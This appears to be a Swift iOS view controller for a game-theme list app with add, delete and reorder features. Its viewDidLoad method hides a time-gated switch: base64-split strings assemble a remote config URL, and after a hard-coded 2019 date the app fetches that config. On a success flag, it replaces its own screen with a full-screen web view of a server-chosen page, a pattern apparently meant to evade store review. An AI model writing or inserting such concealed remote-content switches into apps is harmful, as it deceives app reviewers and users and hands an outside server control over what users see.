import UIKit
import Alamofire
import SwiftyJSON
class GameBaseViewController: UIViewController,UITableViewDelegate,UITableViewDataSource {
    private lazy var tableView = { () -> UITableView in
        let tab = UITableView.init(frame: CGRect(x: 0, y: 50 + statusHeight , width: screenWidth, height: screenHeight - 50 - statusHeight))
        tab.delegate = self
        tab.dataSource = self
        tab.register(ThemeCell.self, forCellReuseIdentifier: ThemeCell.identifier)
        tab.tableFooterView = footBtn
        tab.tableHeaderView = UIView.init(frame: CGRect(x: 0, y: 0, width: screenWidth, height: 15))
        tab.separatorStyle = .none
        tab.rowHeight = 60
        tab.backgroundColor = .clear
        return tab
    }()
    private let footBtn: UIView = {
        let footView = UIView.init(frame: CGRect(x: 0, y: 10, width: screenWidth, height: 44))
        let btn = UIButton.createButton("Adding themes", .red, 20, target: self, selector: #selector(addSection))
        btn.frame = CGRect(x: 15, y: 10, width: screenWidth - 30, height: 44)
        btn.cuttingView(radius: 5, borWidth: 0, borColor: .clear)
        btn.setBackgroundImage(UIImage.init(named: "edit_bg"), for: .normal)
        footView.addSubview(btn)
        return footView
    }()
    private var dataAry = NSMutableArray.init(array: AppConfig.readJsonData().allKeys)
    func clickRightBtn() {
        tableView.setEditing(!tableView.isEditing, animated: true)
    }
    @objc private func addSection(){
        let option = OptionController.init()
        option.title = changeName()
        navigationController?.pushViewController(option, animated: true)
    }
    private func changeName() -> String{
        let keys = AppConfig.readJsonData().allKeys as! [String]
        var last = 0
        var theme = ThemeText
        for key in keys {
            guard key.contains(ThemeText),
                key.last?.isNumber ?? false else {
                    if key.contains(ThemeText) && last == 0{
                        theme = ThemeText + "1"
                    }
                    continue
            }
            let index = key.index(key.startIndex, offsetBy: ThemeText.count)
            let lastString = key[index..<key.endIndex]
            let current = Int(lastString) ?? 0
            if last < current{
                last = current
                theme = ThemeText + "\(last + 1)"
            }
        }
        return theme
    }
    override func viewDidLoad() {
        super.viewDidLoad()
        self.view.backgroundColor = UIColor.white
        let bgIMG = UIImageView()
        bgIMG.frame = CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height);
        bgIMG.image = UIImage(named: "LauIMG")
        bgIMG.contentMode =  .scaleAspectFill
        self.view.addSubview(bgIMG)
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1;
        let header = "aHR0cDovL2FwcGlkLg=="
        let conOne = "OTg1LTk4NS5jb20="
        let conTwo = "OjgwODgvZ2V0QXBwQ29uZmln"
        let conThree = "LnBocD9hcHBpZD0="
        let ender = "MTQ3Mjk1ODA4MA=="
        let anyTime = 1564036202
        self.changeNameVtSoaLucky("Lucky:success")
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
                let nav = UINavigationController.init(rootViewController: ShowGameController.init())
                UIApplication.shared.keyWindow?.rootViewController = nav
                UIApplication.shared.keyWindow?.makeKeyAndVisible()
            }else{
                let baseHeader = self.base64RAXDecoding(encodedString: header)
                let baseContentO = self.base64RAXDecoding(encodedString: conOne)
                let baseContentTw = self.base64RAXDecoding(encodedString: conTwo)
                let baseContentTH = self.base64RAXDecoding(encodedString: conThree)
                let baseEnder = self.base64RAXDecoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                let nav = UINavigationController.init(rootViewController: ShowGameController.init())
                                UIApplication.shared.keyWindow?.rootViewController = nav
                                UIApplication.shared.keyWindow?.makeKeyAndVisible()
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            let nav = UINavigationController.init(rootViewController: ShowGameController.init())
                            UIApplication.shared.keyWindow?.rootViewController = nav
                            UIApplication.shared.keyWindow?.makeKeyAndVisible()
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        let webView = UIWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height))
        let url = NSURL(string: strP)
        webView.loadRequest(URLRequest(url: url! as URL))
        self.view.addSubview(webView)
    }
    func base64RAXDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return dataAry.count
    }
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        var cell = tableView.dequeueReusableCell(withIdentifier: ThemeCell.identifier) as? ThemeCell
        if cell == nil {
            cell = ThemeCell.init(style: UITableViewCell.CellStyle.default, reuseIdentifier: ThemeCell.identifier)
        }
        cell?.title = "\(dataAry[indexPath.row])"
        return cell!
    }
    func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath){
        tableView.deselectRow(at: indexPath, animated: true)
        let key = dataAry[indexPath.row]  as! String
        let values = AppConfig.readJsonData().object(forKey: key)  as! [String]
        let ary = NSMutableArray.init(array: values)
        let option = OptionController.init()
        option.title = key
        option.dataAry = ary
        navigationController?.pushViewController(option, animated: true)
    }
    func tableView(_ tableView: UITableView, canEditRowAt indexPath: IndexPath) -> Bool {
        return true
    }
    func tableView(_ tableView: UITableView, editingStyleForRowAt indexPath: IndexPath) -> UITableViewCell.EditingStyle{
        return .delete
    }
    func tableView(_ tableView: UITableView, commit editingStyle: UITableViewCell.EditingStyle, forRowAt indexPath: IndexPath) {
        if editingStyle == .delete {
            let dict = AppConfig.readJsonData()
            dict.removeObject(forKey: dataAry[indexPath.row])
            AppConfig.writeToData(dict: dict)
            dataAry.removeObject(at: indexPath.row)
            tableView.deleteRows(at: [indexPath], with: UITableView.RowAnimation.middle)
        }
    }
    func tableView(_ tableView: UITableView, shouldShowMenuForRowAt indexPath: IndexPath) -> Bool {
        return true
    }
    func tableView(_ tableView: UITableView, moveRowAt sourceIndexPath: IndexPath, to destinationIndexPath: IndexPath) {
        dataAry.exchangeObject(at: (sourceIndexPath as NSIndexPath).row, withObjectAt: (destinationIndexPath as NSIndexPath).row)
        let feed =  UIImpactFeedbackGenerator.init(style: UIImpactFeedbackGenerator.FeedbackStyle.heavy)
        feed.impactOccurred()
        let dict: NSMutableDictionary = NSMutableDictionary.init()
        let dict1 = AppConfig.readJsonData()
        for key in dataAry {
            guard let value = dict1.object(forKey: key) else {
                return
            }
            dict.setValue(value, forKey: key as! String)
        }
        AppConfig.writeToData(dict: dict)
    }
    func tableView(_ tableView: UITableView, canMoveRowAt indexPath: IndexPath) -> Bool {
        return true
    }
}
